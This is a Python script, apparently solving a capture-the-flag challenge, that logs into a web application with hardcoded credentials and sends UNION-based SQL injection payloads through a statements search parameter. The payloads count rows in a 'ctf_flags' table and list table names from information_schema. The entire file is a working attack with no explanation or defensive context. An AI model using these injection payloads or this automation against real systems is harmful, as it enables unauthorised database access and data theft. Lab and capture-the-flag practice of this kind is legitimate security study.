#!/usr/bin/env python3
import urllib.request
import urllib.parse
import http.cookiejar

url_base = "http://10.141.199.78:9443"
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

try:
    # Login
    login_url = f"{url_base}/login"
    login_data = urllib.parse.urlencode({
        'customer_id': 'ALICE001',
        'password': 'password123'
    }).encode()
    opener.open(urllib.request.Request(login_url, data=login_data, method='POST'), timeout=10)
    print("[+] Logged in")

    # Access statements
    opener.open(urllib.request.Request(f"{url_base}/statements"), timeout=10)
    print("[+] Statements page accessed")

    # Try payload that selects COUNT
    payload = "x' UNION SELECT 1,2,(SELECT COUNT(*) FROM ctf_flags),4,5,6,7#"
    url = f"{url_base}/statements?q={urllib.parse.quote(payload)}&account_id=1"
    response = opener.open(urllib.request.Request(url), timeout=10)
    html = response.read().decode('utf-8', errors='ignore')

    # Look for any number that could be the count
    if '>2<' in html or '>1<' in html or '>0<' in html:
        print("[+] COUNT payload executed")
    else:
        print("[-] COUNT payload didn't execute")

    # Try payload that gets table names
    payload = "x' UNION SELECT 1,2,3,4,table_name,6,7 FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1#"
    url = f"{url_base}/statements?q={urllib.parse.quote(payload)}&account_id=1"
    response = opener.open(urllib.request.Request(url), timeout=10)
    html = response.read().decode('utf-8', errors='ignore')

    # Save for inspection
    with open('debug_output.html', 'w', encoding='utf-8') as f:
        f.write(html[:3000])

    if 'ctf_flags' in html:
        print("[+] Table 'ctf_flags' exists!")
    else:
        print("[-] Table 'ctf_flags' not found")

    if 'information_schema' in html.lower() or 'mysql' in html.lower():
        print("[-] May have SQL error")

    print("[+] Output saved to debug_output.html")

except Exception as e:
    print(f"Error: {e}")
